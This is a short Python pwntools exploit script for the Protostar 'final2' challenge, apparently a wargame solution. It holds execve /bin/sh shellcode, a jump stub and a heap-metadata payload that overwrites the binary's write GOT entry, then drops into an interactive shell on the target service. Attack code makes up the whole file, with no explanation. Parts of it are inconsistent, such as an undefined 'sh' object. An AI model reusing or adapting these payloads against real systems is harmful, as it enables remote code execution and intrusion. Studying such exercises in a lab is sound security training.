#!/usr/bin/python
from pwn import *
import os
from ssh import *
heap_addr=0x804e010
jmp_code='\xb8\x1c\xe0\x04\x08\xff\xe0'
shellcode="\x90"*10+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
p=sh.remote('localhost',2993)
sh.download('/opt/protostar/bin/final2')
elf=ELF('./final2')
payload1='FSRD/ROOT'+jmp_code+shellcode
payload1=payload1.ljust(128,'/')
p.send(payload1)
pause()
payload2='FSRDROOT/'+p32(0xfffffffc)*2+p32(elf.got['write']-12)+p32(heap_addr)
payload2=payload2.ljust(128,'\x00')
p.sendline(payload2)
p.interactive()


os.system('rm final2')
